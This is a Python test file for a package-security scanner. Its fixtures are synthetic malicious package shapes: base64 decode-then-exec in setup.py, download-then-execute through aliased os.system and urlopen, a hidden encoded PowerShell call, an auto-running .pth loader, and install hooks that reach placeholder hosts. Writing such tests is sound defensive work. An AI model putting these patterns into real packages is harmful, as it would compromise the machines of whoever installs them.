"""Offline tests for scan_engine static analysis (run: python3 tests/test_scan_engine.py).

Fixtures are tiny synthetic packages shaped like the real cases that exposed each rule;
nothing here touches the network.
"""
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "guard"))
import scan_engine as se  # noqa: E402


def scan(layout: dict[str, str], archive: str = "pkg-1.0.tar.gz.unpacked", top: str = "pkg-1.0"):
    with tempfile.TemporaryDirectory() as d:
        root = Path(d) / archive / top
        for rel, text in layout.items():
            p = root / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(text)
        f = se.ScanFeatures(name="pkg", version=None, fetch_ok=True)
        se.static_analysis(list(Path(d).rglob("*")), f)
        se.typosquat_check("pkg", f)
        return f, se.compute_verdict(f)


# alias resolution: calls hidden behind imports are still seen (colored-fidget, aeodata, libsock4 shapes)
f, v = scan({"setup.py": "from base64 import b64decode\nimport x\nexec(b64decode('aGk='))\n"})
assert f.has_decode_then_exec and v.verdict == "BLOCK", (f.has_decode_then_exec, v.verdict)
f, v = scan({"setup.py": "from urllib.request import urlopen as _u\nfrom os import system as _s\n_s(_u('http://x').read())\n"})
assert f.has_download_then_execute and v.verdict == "BLOCK"
f, v = scan({"a.py": "_x = exec\n_x(__import__('base64').b64decode('aGk='))\n"})
assert f.keyword_hits.get("exec(") == 1, f.keyword_hits
# ...and the attribute form stays harmless (the original requests false positive)
f, v = scan({"a.py": "import re\nr = re.compile('x')\nobj.exec(1)\nfrom re import compile\ncompile('y')\n"})
assert f.keyword_total == 0, f.keyword_hits

# install-time signals in the root setup.py
f, v = scan({"setup.py": "import requests\nrequests.get('http://o.example', params={'h': 1})\n"})
assert f.setup_network and v.verdict == "NEEDS_HUMAN_REVIEW"
f, v = scan({"setup.py": "import subprocess\nsubprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand AAAA')\n"})
# behavior check: encoded PowerShell run at install = decode_exec(install) → BLOCK
assert f.setup_hidden_shell and v.verdict == "BLOCK", (v.verdict, v.reasons)

# setup.py that does not run at install time: nested ones in an sdist, and any in a wheel
f, v = scan({"setup.py": "from setuptools import setup\nsetup()\n",
             "tools/pip_package/setup.py": "import subprocess\nclass InstallCommand(install):\n    def run(self): subprocess.call(['x'])\n"})
assert not f.has_install_hook and f.setup_keyword_total == 0, (f.has_install_hook, f.setup_keyword_total)
f, v = scan({"tools/setup.py": "class InstallCommand(install):\n    def run(self): pass\n"}, archive="pkg-1.0-py3-none-any.whl.unpacked", top="pkg")
assert not f.has_install_hook

# install hook that runs a local module (dependency-confusion style: nuerst, jaqmc, projectp)
hook = ("from setuptools import setup\nfrom setuptools.command.install import install\n\n"
        "class Strat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\n"
        "setup(name='pkg', cmdclass={'install': Strat})\n")
f, v = scan({"setup.py": hook, "main.py": "import urllib.request\nurllib.request.urlopen('http://o.example')\n"})
assert f.setup_import_keyword_total == 1 and v.verdict == "NEEDS_HUMAN_REVIEW", (f.setup_import_keyword_total, v.verdict)
assert any(e["rule"] == "install_hook_import" and e["file"] == "main.py" for e in f.evidence)
# ...but a top-level helper import, or importing a whole package, does not pull its keywords into the hook rule
f, v = scan({"setup.py": "import setupinfo\nfrom setuptools import setup\nclass S(install):\n    def run(self): pass\nsetup(cmdclass={'install': S})\n",
             "setupinfo.py": "import subprocess\nsubprocess.call(['cc'])\n"})
assert f.setup_import_keyword_total == 0 and v.verdict == "ALLOW", (f.setup_import_keyword_total, v.verdict)
f, v = scan({"setup.py": "class S(install):\n    def run(self):\n        import numpy\n",
             "numpy/core.py": "import pickle\npickle.loads(b'')\n"})
assert f.setup_import_keyword_total == 0

# a long URL is not an encoded payload; a real base64 blob still is
url = "# see https://github.com/org/repo/blob/" + "a1b2c3d4e5f6" * 8 + "/file.py"
f, v = scan({"a.py": url + "\n"})
assert f.max_entropy == 0.0, f.max_entropy
f, v = scan({"a.py": 'BLOB = "' + "Zm9vYmFyYmF6cXV4" * 8 + 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"\n'})
assert f.max_entropy > 4.5

# repo maintenance dirs and tests are not consumer-run code
f, v = scan({"scripts/internal/install_pip.py": "from urllib.request import urlopen\nimport os\nurlopen('http://x')\nos.system('python x')\n",
             "tests/test_a.py": "import os\nos.system('x')\n"})
assert not f.has_download_then_execute and f.keyword_total == 0

# test dirs with a prefix ("e2e-tests/") and pytest's conftest.py are test infrastructure too (falcon)
f, v = scan({"e2e-tests/conftest.py": "import subprocess, requests\nsubprocess.Popen(['uvicorn'])\nrequests.get('http://x/ping')\n",
             "pkg/integration_tests/helper.py": "import os\nos.system('x')\n"})
assert not f.has_download_then_execute and f.keyword_total == 0, (f.has_download_then_execute, f.keyword_hits)
f, v = scan({"pkg/latest_tests.py": "import os\nos.system('x')\n"})   # "x_tests.py" is not a test-file pattern: still scanned
assert f.keyword_total == 1

# short names need an exact 1-edit typosquat match, long names allow 2
for name, expect in (("mcp", False), ("black", False), ("requets", True), ("reqeusts", True)):
    ft = se.ScanFeatures(name=name, version=None)
    se.typosquat_check(name, ft)
    flagged = any("typosquatting" in r for r in se.compute_verdict(ft).reasons)
    assert flagged == expect, (name, flagged)

# bounded scan: a package that cannot finish inside the budget is reported, not dropped
orig = se.scan_package
se.scan_package = lambda n, v=None: __import__("time").sleep(5)
try:
    out = se.scan_packages([("slow-a", None), ("slow-b", None)], budget=0.3)
    assert [r.verdict for r in out] == ["NEEDS_HUMAN_REVIEW"] * 2 and "timed out" in out[0].reasons[0]
finally:
    se.scan_package = orig

# a wheel / sdist on disk (`pip install ./x.whl`): the same code rules, no PyPI lookups (2026-10-23)
import io, tarfile, zipfile  # noqa: E401,E402
with tempfile.TemporaryDirectory() as d:
    evil = Path(d) / "fast_tool-0.1-py3-none-any.whl"
    with zipfile.ZipFile(evil, "w") as z:
        z.writestr("fast_tool/__init__.py", "x = 1\n")
        z.writestr("fast_tool_init.pth", "import base64;exec(base64.b64decode('aW1wb3J0IG9z'))\n")
    v = se.scan_local_file(evil)
    assert v.verdict == "BLOCK" and (v.features.name, v.features.version) == ("fast-tool", "0.1"), (v.verdict, v.reasons)
    assert v.features.package_capabilities is not None
    good = Path(d) / "good-0.1-py3-none-any.whl"
    with zipfile.ZipFile(good, "w") as z:
        z.writestr("good/__init__.py", "def add(a, b):\n    return a + b\n")
    assert se.scan_local_file(good).verdict == "ALLOW"
    sd = Path(d) / "corp-utils-1.4.2.tar.gz"
    with tarfile.open(sd, "w:gz") as t:
        data = b"import os, urllib.request\nurllib.request.urlopen('http://x.example/p')\nfrom setuptools import setup\nsetup()\n"
        info = tarfile.TarInfo("corp-utils-1.4.2/setup.py")
        info.size = len(data)
        t.addfile(info, io.BytesIO(data))
    v = se.scan_local_file(sd)
    assert v.verdict != "ALLOW" and (v.features.name, v.features.version) == ("corp-utils", "1.4.2"), (v.verdict, v.reasons)
    assert v.features.min_edit_distance is None and not v.features.osv_vulns      # no name-based checks for a local file
    broken = Path(d) / "broken-1.0-py3-none-any.whl"
    broken.write_bytes(b"not a zip")
    assert se.scan_local_file(broken).verdict == "NEEDS_HUMAN_REVIEW"

print("scan_engine: all cases passed")
